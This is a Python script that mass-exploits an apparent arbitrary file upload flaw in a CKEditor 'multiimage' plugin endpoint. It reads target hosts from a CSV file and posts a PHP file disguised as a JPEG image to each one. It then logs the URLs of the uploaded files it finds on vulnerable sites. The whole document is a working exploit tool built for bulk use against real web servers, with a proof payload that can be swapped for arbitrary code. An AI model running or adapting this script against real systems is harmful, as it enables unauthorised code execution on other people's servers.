#!/usr/bin/python3
# -*- coding:utf-8 -*-

import ssl
import sys
import requests
import csv
import urllib3
import hashlib

urllib3.disable_warnings()

if len(sys.argv) != 5:
    print('''
+ USE: python3 <filename> <input_file> <start_row> <end_row> <output_file>''')
    sys.exit()

def exp(host, row_number):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
        
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1",
        "Content-Type": "multipart/form-data; boundary=cadc403efc1ad12f5fcce44c172baad2",
        "Host": "%s" %host2
    }
    data ="""--cadc403efc1ad12f5fcce44c172baad2
Content-Disposition: form-data; name="files"; filename="c.php"
Content-Type: image/jpg

<?php phpinfo();?>
--cadc403efc1ad12f5fcce44c172baad2--
"""
    vulurl = url + "/Public/ckeditor/plugins/multiimage/dialogs/image_upload.php"
    try:
        r = requests.post(vulurl, headers=headers, data=data, verify=False)
        if "imgurl" in r.text:
            print(f"{row_number}: {r.text}:imgurl")
            json_dict = r.json()
            result = url + "/Public/" + json_dict["imgurl"]
            print(result)
            with open(output_file, 'a') as f:
                f.write(result + '\n')
        else:
            print(f"{row_number}: {host}:false")
    except:
        print(f"{row_number}: {host}:error")


if __name__ == '__main__':
    input_file = sys.argv[1]
    start_row = int(sys.argv[2])
    end_row = int(sys.argv[3])
    output_file = sys.argv[4]
    data = open(input_file)
    reader = csv.reader(data)
    rows = list(reader)[start_row:end_row+1]
    for idx, row in enumerate(rows, start=start_row):
        exp(row[0], idx)
